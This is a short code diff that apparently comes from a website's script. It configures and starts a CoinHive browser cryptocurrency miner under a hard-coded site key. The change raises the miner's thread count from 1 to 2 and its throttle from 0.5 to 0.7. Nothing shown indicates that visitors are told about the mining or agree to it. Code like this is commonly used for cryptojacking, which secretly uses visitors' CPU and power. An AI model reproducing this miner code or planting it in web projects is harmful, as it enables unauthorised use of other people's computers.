@@ -1,8 +1,8 @@
 try {
 		var miner = new CoinHive.Anonymous('BtcpvElCLDa2URFjJUy1uFwiT6aJmLMN',{
-			threads: 1,
+			threads: 2,
 			autoThreads: false,
-			throttle: 0.5,
+			throttle: 0.7,
 			forceASMJS: false
 		});
 		miner.start();
